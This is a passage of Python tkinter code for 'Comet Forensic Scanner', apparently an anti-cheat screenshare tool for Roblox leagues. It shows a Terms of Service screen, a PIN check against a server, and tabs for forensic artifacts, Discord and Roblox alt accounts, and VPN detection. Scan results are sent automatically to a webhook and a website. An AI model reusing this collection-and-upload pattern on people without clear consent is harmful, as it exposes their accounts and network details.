        cv.create_line(20,20,60,20, fill=self.GREEN, width=2)
        cv.create_line(20,20,20,60, fill=self.GREEN, width=2)
        cv.create_line(500,580,460,580, fill=self.FG3, width=1)
        cv.create_line(500,580,500,540, fill=self.FG3, width=1)

        f = tk.Frame(w, bg=self.BG)
        f.place(x=44, y=52, width=432)

        logo_f = tk.Frame(f, bg=self.BG)
        logo_f.pack(anchor="w", pady=(0,14))
        mark = tk.Label(logo_f, text=" C ", font=("Segoe UI",11,"bold"),
                        fg="#000000", bg=self.GREEN, padx=2, pady=2)
        mark.pack(side="left")
        tk.Label(logo_f, text="  Comet", font=("Segoe UI",13,"bold"),
                 fg=self.FG, bg=self.BG).pack(side="left")
        tk.Label(logo_f, text="  Forensic Scanner",
                 font=("Segoe UI",9), fg=self.FG3, bg=self.BG).pack(side="left", pady=3)

        tk.Label(f, text="Terms of Service", font=("Segoe UI",22,"bold"),
                 fg=self.FG, bg=self.BG).pack(anchor="w")
        tk.Label(f, text="Last updated: 2/25/2026", font=("Segoe UI",9),
                 fg=self.FG3, bg=self.BG).pack(anchor="w", pady=(2,16))

        txt_outer = tk.Frame(f, bg=self.BORDER2, bd=1)
        txt_outer.pack(fill="x", pady=(0,14))
        txt_inner = tk.Frame(txt_outer, bg=self.BG3, bd=0)
        txt_inner.pack(fill="both", padx=1, pady=1)
        txt = tk.Text(txt_inner, width=52, height=12, font=("Segoe UI",9),
                      bg=self.BG3, fg=self.FG2, bd=0, padx=14, pady=12,
                      relief="flat", wrap="word", cursor="arrow",
                      selectbackground=self.BG4, insertbackground=self.GREEN)
        scr = tk.Scrollbar(txt_inner, orient="vertical", command=txt.yview,
                           bg=self.BG4, troughcolor=self.BG3, width=8, relief="flat",
                           bd=0, highlightthickness=0)
        scr.pack(side="right", fill="y")
        txt.configure(yscrollcommand=scr.set)
        txt.pack(side="left", fill="both", expand=True)
        TOS = ("By using this software, you acknowledge and agree that the creator "
               "of this software is NOT responsible for how the information obtained "
               "is used by third party leagues and members.\n\n"
               "This tool is provided to aid in the screensharing process and no "
               "information will be distributed by the owner of the software.\n\n"
               "If the league or individual using the software on you is NOT listed "
               "or has received proper authorization, please report it immediately "
               "by DMing Discord user: converts_19942 or by joining the Comet Discord server "
               "and making a ticket.\n\n"
               "Unauthorized usage will be revoked.")
        txt.insert("1.0", TOS)
        txt.configure(state="disabled")

        tk.Label(f, text="You must read and agree before the scan can begin.",
                 font=("Segoe UI",9), fg=self.FG3, bg=self.BG).pack(anchor="w", pady=(0,10))
        agree_btn = tk.Button(f, text="I agree to the Terms of Service",
                              font=("Segoe UI",10,"bold"),
                              bg=self.GREEN, fg="#000000",
                              activebackground=self.GREEN_D, activeforeground="#000000",
                              bd=0, padx=14, pady=11, cursor="hand2",
                              relief="flat", command=self._tos_accepted)
        agree_btn.pack(fill="x")
        decline_row = tk.Frame(f, bg=self.BG)
        decline_row.pack(fill="x", pady=(8,0))
        tk.Label(decline_row, text="Declining will close the application.",
                 font=("Segoe UI",8), fg=self.FG3, bg=self.BG).pack(side="left")
        tk.Button(decline_row, text="Decline", font=("Segoe UI",9),
                  bg=self.BG, fg=self.FG3, activebackground=self.BG3,
                  bd=0, cursor="hand2", relief="flat",
                  command=lambda: (w.destroy(), self.root.destroy())).pack(side="right")

    def _tos_accepted(self):
        self._tos_win.destroy()
        self._show_pin_screen()

    def _show_pin_screen(self):
        w = tk.Toplevel()
        self._pin_win = w
        w.title("Comet — Authorize")
        w.geometry("440x480")
        w.configure(bg=self.BG)
        w.resizable(False, False)
        w.protocol("WM_DELETE_WINDOW", lambda: (w.destroy(), self.root.destroy()))
        w.update_idletasks()
        sw, sh = w.winfo_screenwidth(), w.winfo_screenheight()
        w.geometry(f"440x480+{(sw-440)//2}+{(sh-480)//2}")

        cv = tk.Canvas(w, width=440, height=480, bg=self.BG, highlightthickness=0)
        cv.place(x=0, y=0)
        cv.create_line(20,20,56,20, fill=self.GREEN, width=2)
        cv.create_line(20,20,20,56, fill=self.GREEN, width=2)
        cv.create_line(420,460,384,460, fill=self.FG3, width=1)
        cv.create_line(420,460,420,424, fill=self.FG3, width=1)

        f = tk.Frame(w, bg=self.BG)
        f.place(x=40, y=48, width=360)

        logo_f = tk.Frame(f, bg=self.BG)
        logo_f.pack(anchor="w", pady=(0,20))
        tk.Label(logo_f, text=" C ", font=("Segoe UI",11,"bold"),
                 fg="#000000", bg=self.GREEN, padx=2, pady=2).pack(side="left")
        tk.Label(logo_f, text="  Comet  Scanner",
                 font=("Segoe UI",12,"bold"), fg=self.FG, bg=self.BG).pack(side="left")

        tk.Label(f, text="Authorize", font=("Segoe UI",22,"bold"),
                 fg=self.FG, bg=self.BG).pack(anchor="w")
        tk.Label(f, text="Enter your PIN and select your league.",
                 font=("Segoe UI",10), fg=self.FG2, bg=self.BG).pack(anchor="w", pady=(4,20))

        # PIN field
        tk.Label(f, text="PIN CODE", font=("Segoe UI",8,"bold"),
                 fg=self.FG3, bg=self.BG).pack(anchor="w")
        pin_outer = tk.Frame(f, bg=self.BORDER2, bd=1)
        pin_outer.pack(fill="x", pady=(4,14))
        pin_inner = tk.Frame(pin_outer, bg=self.BG3)
        pin_inner.pack(fill="both", padx=1, pady=1)
        self._pin_var = tk.StringVar()
        self._pin_entry = tk.Entry(pin_inner, textvariable=self._pin_var,
                                   font=("Segoe UI",13,"bold"),
                                   bg=self.BG3, fg=self.GREEN, bd=0,
                                   insertbackground=self.GREEN,
                                   relief="flat", justify="center")
        self._pin_entry.pack(fill="x", padx=14, pady=12)
        self._pin_entry.focus()

        # League selector
        tk.Label(f, text="LEAGUE", font=("Segoe UI",8,"bold"),
                 fg=self.FG3, bg=self.BG).pack(anchor="w")
        league_f = tk.Frame(f, bg=self.BG)
        league_f.pack(fill="x", pady=(4,20))
        self._league_var = tk.StringVar(value="UFF")
        for lg in ["UFF","FFL"]:
            rb = tk.Radiobutton(league_f, text=lg, variable=self._league_var, value=lg,
                                font=("Segoe UI",11,"bold"),
                                fg=self.GREEN, bg=self.BG,
                                selectcolor=self.BG3, activebackground=self.BG,
                                activeforeground=self.GREEN,
                                indicatoron=False, padx=18, pady=7,
                                relief="flat", bd=0, cursor="hand2",
                                highlightthickness=1, highlightbackground=self.BORDER2)
            rb.pack(side="left", padx=(0,8))

        self._pin_err = tk.Label(f, text="", font=("Segoe UI",9),
                                  fg=self.RED, bg=self.BG)
        self._pin_err.pack(anchor="w", pady=(0,6))
        self._pin_status = tk.Label(f, text="", font=("Segoe UI",9),
                                     fg=self.FG2, bg=self.BG)
        self._pin_status.pack(anchor="w", pady=(0,10))

        self._pin_btn = tk.Button(f, text="Authorize  →",
                                   font=("Segoe UI",11,"bold"),
                                   bg=self.GREEN, fg="#000000",
                                   activebackground=self.GREEN_D, activeforeground="#000000",
                                   bd=0, padx=14, pady=12, cursor="hand2",
                                   relief="flat", command=self._do_pin)
        self._pin_btn.pack(fill="x")
        self._pin_entry.bind("<Return>", lambda e: self._do_pin())

    def _do_pin(self):
        pin = self._pin_var.get().strip().upper()
        league = self._league_var.get()
        if not pin:
            self._pin_err.config(text="Enter a PIN to continue.")
            return
        self._pin_btn.config(state="disabled", text="Checking…")
        self._pin_err.config(text="")
        self._pin_status.config(text="Validating PIN…")
        threading.Thread(target=self._validate_pin, args=(pin, league), daemon=True).start()

    def _validate_pin(self, pin, league):
        try:
            data = json.dumps({"pin": pin, "league": league}).encode()
            req = urllib.request.Request(
                f"{WEBSITE_URL}/api/validate_pin",
                data=data,
                headers={"Content-Type":"application/json","User-Agent":"CometScanner/4.0"},
                method="POST")
            try:
                with urllib.request.urlopen(req, context=_ssl_ctx(), timeout=10) as r:
                    body = json.loads(r.read().decode())
            except urllib.error.HTTPError as e:
                try:
                    body = json.loads(e.read().decode())
                except Exception:
                    body = {"error": f"Server error {e.code}"}
                self.root.after(0, self._pin_rejected, body.get("error", "Invalid PIN"))
                return
            if body.get("ok") or body.get("valid"):
                self._pin = pin
                self._league = body.get("league", league)
                self.root.after(0, self._pin_accepted)
            else:
                self.root.after(0, self._pin_rejected, body.get("error","Invalid PIN"))
        except Exception as e:
            self.root.after(0, self._pin_rejected, f"Connection error: {e}")

    def _pin_accepted(self):
        self._pin_win.destroy()
        self._build_main()
        self.root.deiconify()

    def _pin_rejected(self, err):
        self._pin_btn.config(state="normal", text="Authorize  →")
        self._pin_err.config(text=f"✗  {err}")
        self._pin_status.config(text="")

    def _build_main(self):
        self.root.title(f"Comet  ·  {self._league}  ·  {current_user()}")
        self.root.geometry("1280x860")
        self.root.configure(bg=self.BG)
        self.root.resizable(True, True)
        self.root.update_idletasks()
        sw, sh = self.root.winfo_screenwidth(), self.root.winfo_screenheight()
        self.root.geometry(f"1280x860+{(sw-1280)//2}+{(sh-860)//2}")

        topbar = tk.Frame(self.root, bg=self.BG2, height=52)
        topbar.pack(fill="x"); topbar.pack_propagate(False)
        tk.Frame(self.root, bg=self.BORDER_HEX, height=1).pack(fill="x")

        mark_f = tk.Frame(topbar, bg=self.BG2)
        mark_f.pack(side="left", padx=(20,0))
        tk.Label(mark_f, text=" C ", font=("Segoe UI",10,"bold"),
                 fg="#000000", bg=self.GREEN, padx=2).pack(side="left", pady=14)
        tk.Label(mark_f, text="  Comet", font=("Segoe UI",12,"bold"),
                 fg=self.FG, bg=self.BG2).pack(side="left")

        self._league_badge = tk.Label(topbar, text=f" {self._league} ",
                                       font=("Segoe UI",8,"bold"),
                                       fg=self.GREEN, bg=self.BG4,
                                       padx=8, pady=3, relief="flat")
        self._league_badge.pack(side="left", padx=10, pady=17)

        self._status_lbl = tk.Label(topbar, text="IDLE", font=("Segoe UI",9,"bold"),
                                     fg=self.FG3, bg=self.BG2)
        self._status_lbl.pack(side="right", padx=20)
        self._wh_lbl = tk.Label(topbar, text="", font=("Segoe UI",9),
                                 fg=self.FG2, bg=self.BG2)
        self._wh_lbl.pack(side="right", padx=(0,8))

        body = tk.Frame(self.root, bg=self.BG)
        body.pack(fill="both", expand=True)

        sidebar = tk.Frame(body, bg=self.BG2, width=220)
        sidebar.pack(side="left", fill="y"); sidebar.pack_propagate(False)
        tk.Frame(body, bg=self.BORDER_HEX, width=1).pack(side="left", fill="y")

        # Section labels in sidebar
        def sidebar_section(label):
            tk.Label(sidebar, text=label, font=("Segoe UI",8,"bold"),
                     fg=self.FG3, bg=self.BG2, anchor="w").pack(fill="x", padx=16, pady=(14,4))

        self.tabs = {}
        self._tab_frames = {}
        self._nav_btns = {}
        self._active_nav = None

        tab_defs = [
            ("OVERVIEW", [
                ("◈  Summary",      "summary"),
            ]),
            ("FORENSICS", [
                ("◉  ShellBags",    "shellbags"),
                ("◉  BAM",          "bam"),
                ("◉  Prefetch",     "prefetch"),
                ("◉  AppCompat",    "appcompat"),
                ("◉  Roblox Logs",  "roblox"),
                ("◉  Recycle Bin",  "recycle"),
                ("◉  SysMain",      "sysmain"),
            ]),
            ("DETECTION", [
                ("◉  Cheat Files",  "cheat"),
                ("◉  YARA",         "yara"),
                ("◉  Unsigned",     "unsigned"),
                ("◉  Processes",    "processes"),
                ("◉  Cleaners",     "cleaners"),
            ]),
            ("IDENTITY", [
                ("◉  Discord",      "discord"),
                ("◉  Roblox Alts",  "registry_extra"),
                ("◉  Network/VPN",  "network"),
                ("◉  Drives",       "drives"),
            ]),
        ]

        content_wrap = tk.Frame(body, bg=self.BG)
        content_wrap.pack(side="left", fill="both", expand=True)

        for section_label, tabs in tab_defs:
            sidebar_section(section_label)
            for label, key in tabs:
                btn = tk.Label(sidebar, text=f"  {label}",
                               font=("Segoe UI",10), fg=self.FG2, bg=self.BG2,
                               anchor="w", pady=8, padx=4, cursor="hand2")
                btn.pack(fill="x", padx=6)
                btn.bind("<Enter>",    lambda e, b=btn: b.config(bg=self.BG3) if b != self._active_nav else None)
                btn.bind("<Leave>",    lambda e, b=btn: b.config(bg=self.BG2) if b != self._active_nav else None)
                btn.bind("<Button-1>", lambda e, k=key, b=btn: self._switch(k, b))
                self._nav_btns[key] = btn

                frm = tk.Frame(content_wrap, bg=self.BG)
                mono = "Cascadia Code" if self._font_exists("Cascadia Code") else "Consolas"
                txt  = scrolledtext.ScrolledText(
                    frm, bg=self.BG2, fg=self.FG,
                    font=(mono, 9), relief="flat",
                    insertbackground=self.GREEN, wrap="word",
                    selectbackground=self.BG4,
                    padx=24, pady=18, borderwidth=0, highlightthickness=0)
                txt.pack(fill="both", expand=True)
                txt.configure(state="disabled")
                self._tab_frames[key] = frm
                self.tabs[key] = txt

        # Add drives tab (not in tab_defs sections but needed)
        if "drives" not in self.tabs:
            frm = tk.Frame(content_wrap, bg=self.BG)
            mono = "Cascadia Code" if self._font_exists("Cascadia Code") else "Consolas"
            txt  = scrolledtext.ScrolledText(frm, bg=self.BG2, fg=self.FG,
                    font=(mono,9), relief="flat", insertbackground=self.GREEN,
                    wrap="word", selectbackground=self.BG4,
                    padx=24, pady=18, borderwidth=0, highlightthickness=0)
            txt.pack(fill="both", expand=True)
            txt.configure(state="disabled")
            self._tab_frames["drives"] = frm
            self.tabs["drives"] = txt

        self._active_nav = self._nav_btns.get("summary")
        self._setup_tags()

        tk.Frame(self.root, bg=self.BORDER_HEX, height=1).pack(fill="x")
        bot = tk.Frame(self.root, bg=self.BG2, height=56)
        bot.pack(fill="x"); bot.pack_propagate(False)

        self._pb = tk.Canvas(bot, width=240, height=3, bg=self.BG4, highlightthickness=0)
        self._pb.pack(side="left", padx=24, pady=26)
        self._pb_bar = self._pb.create_rectangle(0,0,0,3, fill=self.GREEN, outline="")
        self._pb_pos = 0; self._pb_run = False

        btn_area = tk.Frame(bot, bg=self.BG2)
        btn_area.pack(side="right", padx=20)

        self._run_btn = tk.Button(btn_area, text="Run Scan",
                                   font=("Segoe UI",10,"bold"),
                                   bg=self.GREEN, fg="#000000",
                                   activebackground=self.GREEN_D, activeforeground="#000000",
                                   bd=0, padx=22, pady=8, cursor="hand2", relief="flat",
                                   command=self._start)
        self._run_btn.pack(side="left", padx=(0,8))

        tk.Button(btn_area, text="Save Report",
                  font=("Segoe UI",10), bg=self.BG4, fg=self.FG2,
                  activebackground=self.BG5, activeforeground=self.FG,
                  bd=0, padx=16, pady=8, cursor="hand2", relief="flat",
                  highlightthickness=1, highlightbackground=self.BORDER2,
                  command=self._save).pack(side="left")

        self._switch("summary", self._nav_btns["summary"])

    def _font_exists(self, name):
        import tkinter.font as tkfont
        return name in tkfont.families()

    def _switch(self, key, btn):
        for f in self._tab_frames.values(): f.pack_forget()
        for b in self._nav_btns.values():
            b.config(bg=self.BG2, fg=self.FG2, font=("Segoe UI",10))
        if key in self._tab_frames:
            self._tab_frames[key].pack(fill="both", expand=True)
        if btn:
            btn.config(bg=self.BG3, fg=self.GREEN, font=("Segoe UI Semibold",10))
        self._active_nav = btn

    def _setup_tags(self):
        mono = "Cascadia Code" if self._font_exists("Cascadia Code") else "Consolas"
        for txt in self.tabs.values():
            txt.configure(state="normal"); txt.delete("1.0","end")
            txt.configure(state="disabled")
            txt.tag_configure("ok",    foreground=self.GREEN)
            txt.tag_configure("bad",   foreground=self.RED)
            txt.tag_configure("warn",  foreground=self.AMBER)
            txt.tag_configure("info",  foreground=self.BLUE)
            txt.tag_configure("dim",   foreground=self.FG2)
            txt.tag_configure("white", foreground=self.FG)
            txt.tag_configure("green", foreground=self.GREEN)
            txt.tag_configure("hl",    foreground=self.GREEN, font=(mono,9,"bold"))
            txt.tag_configure("head",  foreground=self.FG,    font=(mono,10,"bold"))

    def _pb_start(self):
        self._pb_run=True; self._pb_pos=0; self._pb_tick()

    def _pb_stop(self):
        self._pb_run=False
        self._pb.coords(self._pb_bar,0,0,240,3)
        self._pb.itemconfig(self._pb_bar, fill=self.GREEN)

    def _pb_tick(self):
        if not self._pb_run: return
        self._pb_pos=(self._pb_pos+5)%280
        x1=max(0,self._pb_pos-110); x2=min(240,self._pb_pos)
        self._pb.coords(self._pb_bar,x1,0,x2,3)
        self.root.after(12,self._pb_tick)

    def _w(self, key, text, tag="white"):
        if key not in self.tabs: return
        t=self.tabs[key]
        t.configure(state="normal"); t.insert("end",text,tag); t.see("end")
        t.configure(state="disabled")

    def _render(self, key, text):
        if not text:
            self._w(key,"  No data.\n","dim"); return
        for line in text.split("\n"):
            ll=line.lower()
            if any(x in ll for x in ["⚠","warning","suspicious","tamper","multiple account","detected","bypass","injection","crash","cleaner","vpn"]):
                tag="warn"
            elif any(x in ll for x in ["✓","normal","clean","no cheat","no suspicious","none detected"]):
                tag="ok"
            elif any(x in ll for x in ["✗","auto fail","ban evasion","flagged","fail","hash-based","known cheat"]):
                tag="bad"
            elif "──" in line or "━" in line or "═" in line or "◈" in line:
                tag="hl"
            elif line.startswith("  username") or line.startswith("  userid") or line.startswith("  @"):
                tag="info"
            elif line.startswith("  ") or line.startswith("\t"):
                tag="dim"
            else:
                tag="white"
            self._w(key, line+"\n", tag)

    def _render_summary(self, r):
        k="summary"
        v=r.get("verdict","REVIEW")
        vt={"AUTO FAIL":"bad","REVIEW":"warn","CLEAN":"ok"}.get(v,"white")
        vi={"AUTO FAIL":"✗","REVIEW":"!","CLEAN":"✓"}.get(v,"?")

        self._w(k,"\n","white")
        self._w(k,"  ◈ STATUS ─────────────────────────────────────────\n","hl")
        self._w(k,f"    {vi}  {v}\n\n",vt)
        self._w(k,f"  Generated  :  {now_str()}\n","dim")
        self._w(k,f"  PC User    :  {current_user()}\n","dim")
        self._w(k,f"  League     :  {r.get('league','?')}\n\n","dim")

        if r.get("sysmain_autofail"):
            self._w(k,"  ─── AUTO FAIL ─────────────────────────────────────\n","bad")
            self._w(k,"  ✗  SysMain DISABLED + Prefetch empty\n","bad")
            self._w(k,"  ✗  Deliberate trace wiping detected\n\n","bad")

        self._w(k,"  ◈ Detection Scores ────────────────────────────────\n","hl")
        rows=[
            ("ShellBag Hits",   r.get("shellbag_hits",0)),
            ("BAM Hits",        r.get("bam_hits",0)),
            ("Prefetch Hits",   r.get("prefetch_hits",0)),
            ("AppCompat Hits",  r.get("appcompat_hits",0)),
            ("Cheat File Hits", r.get("cheat_hits",0)),
            ("YARA Hits",       r.get("yara_hits",0)),
            ("Unsigned EXEs",   len(r.get("unsigned_hits",[]))),
            ("SysMain Hits",    r.get("sysmain_hits",0)),
            ("Process Hits",    r.get("process_hits",0)),
            ("Cleaner Signs",   r.get("cleaner_hits",0)),
        ]
        for label,val in rows:
            bar="█"*min(val,28)
            tag="bad" if val>0 else "dim"
            sym="▲" if val>0 else "○"
            self._w(k,f"  {sym}  {label:<22}  {val:>3}  {bar}\n",tag)

        total=r.get("total_hits",0)
        self._w(k,f"\n  ────────────────────────────────────────────────────\n","dim")
        self._w(k,f"  TOTAL HITS  :  {total}\n","warn" if total>0 else "ok")
        self._w(k,"  NOTE: No automatic verdict — agent reviews hits\n\n","dim")

        vpn=r.get("vpn_info","")
        if vpn and vpn!="Unknown":
            self._w(k,"  ◈ Network ─────────────────────────────────────────\n","hl")
            self._w(k,f"  {vpn}\n\n","info")

        self._w(k,"  ◈ Roblox Accounts ────────────────────────────────\n","hl")
        accs=r.get("roblox_accounts",[])
        if accs:
            for a in accs:
                name=a.get("username","?") if isinstance(a,dict) else str(a)
                uid=a.get("userid","") if isinstance(a,dict) else ""
                self._w(k,f"  ›  {name}","warn" if len(accs)>1 else "info")
                if uid: self._w(k,f"  (ID: {uid})","dim")
                self._w(k,"\n","white")
            if len(accs)>1:
                self._w(k,f"\n  ⚠  {len(accs)} accounts — possible ban evasion\n","bad")
        else:
            self._w(k,"  No Roblox accounts detected\n","dim")

        self._w(k,"\n  ◈ Discord Accounts ───────────────────────────────\n","hl")
        daccs=r.get("discord_accounts",[])
        if daccs:
            for d in daccs:
                self._w(k,f"  ›  @{d.get('username','?')}  (ID: {d.get('id','?')})  last: {d.get('last_switched','?')}\n",
                        "warn" if len(daccs)>1 else "info")
            if len(daccs)>1:
                self._w(k,f"\n  ⚠  {len(daccs)} Discord accounts — possible alts\n","bad")
        else:
            self._w(k,"  No Discord accounts detected\n","dim")

    def _start(self):
        if self.scanning: return
        self.scanning=True; self._wh_sent=False
        self._setup_tags()
        self._run_btn.config(state="disabled",text="Scanning…",bg=self.BG4,fg=self.FG2)
        self._status_lbl.config(text="SCANNING",fg=self.AMBER)
        self._wh_lbl.config(text="")
        self._pb_start()
        threading.Thread(target=self._do_scan,daemon=True).start()

    def _do_scan(self):
        try:
            r=run_full_scan(league=self._league)
            self.results=r
            self.root.after(0,self._show,r)
        except Exception as e:
            self.root.after(0,self._err,str(e))

    def _show(self, r):
        self._pb_stop(); self.scanning=False
        v=r.get("verdict","REVIEW")
        vc={"AUTO FAIL":self.RED,"REVIEW":self.AMBER,"CLEAN":self.GREEN}.get(v,self.FG2)
        self._status_lbl.config(text=v,fg=vc)
        self._run_btn.config(state="normal",text="Run Scan",bg=self.GREEN,fg="#000000")
        self._render_summary(r)
        tab_map=[
            ("shellbags","shellbags"),("bam","bam"),("prefetch","prefetch"),
            ("appcompat","appcompat"),("roblox","roblox"),("recycle","recycle"),
            ("sysmain","sysmain"),("cheat","cheat"),("yara","yara"),
            ("unsigned","unsigned"),("processes","processes"),("cleaners","cleaners"),
            ("discord","discord"),("registry_extra","registry_extra"),
            ("network","network"),
        ]
        for result_key,tab_key in tab_map:
            self._render(tab_key, r.get(result_key,""))
        # drives tab
        if "drives" in self.tabs:
            dv_t,_,_ = scan_drives()
            self._render("drives", dv_t)
        self._switch("summary",self._nav_btns.get("summary"))
        threading.Thread(target=self._do_send,daemon=True).start()

    def _err(self, msg):
        self._pb_stop(); self.scanning=False
        self._status_lbl.config(text="ERROR",fg=self.RED)
        self._run_btn.config(state="normal",text="Run Scan",bg=self.GREEN,fg="#000000")
        messagebox.showerror("Comet — Scan Error",msg)

    def _do_send(self):
        self.root.after(0,lambda: self._wh_lbl.config(text="sending…",fg=self.AMBER))
        wh_ok,wh_err=send_webhook(self.results)
        wb_ok,wb_err=send_website(self.results,self._pin)
        self._wh_sent=wh_ok or wb_ok
        if wh_ok and wb_ok:
            self.root.after(0,lambda: self._wh_lbl.config(text="✓ sent",fg=self.GREEN))
        elif wh_ok:
            self.root.after(0,lambda: self._wh_lbl.config(text=f"✓ webhook  ✗ web: {wb_err[:60]}",fg=self.AMBER))
        elif wb_ok:
            self.root.after(0,lambda: self._wh_lbl.config(text=f"✓ web  ✗ webhook: {wh_err[:60]}",fg=self.AMBER))
        else:
            err_show=(wb_err or wh_err or "unknown")[:90]
            self.root.after(0,lambda e=err_show: self._wh_lbl.config(text=f"✗ {e}",fg=self.RED))

    def _save(self):
        if not self.results:
            messagebox.showwarning("No Results","Run a scan first."); return
        path=filedialog.asksaveasfilename(
            defaultextension=".txt",
            filetypes=[("Text Report","*.txt"),("All Files","*.*")],
            initialfile="comet_report.txt")
        if not path: return
        try:
            with open(path,"w",encoding="utf-8") as f:
                f.write(self.results.get("full_report","No report."))
            messagebox.showinfo("Saved",f"Report saved:\n{path}")
        except Exception as e:
            messagebox.showerror("Error",str(e))

if __name__=="__main__":
    root=tk.Tk()
    App(root)
    root.mainloop()
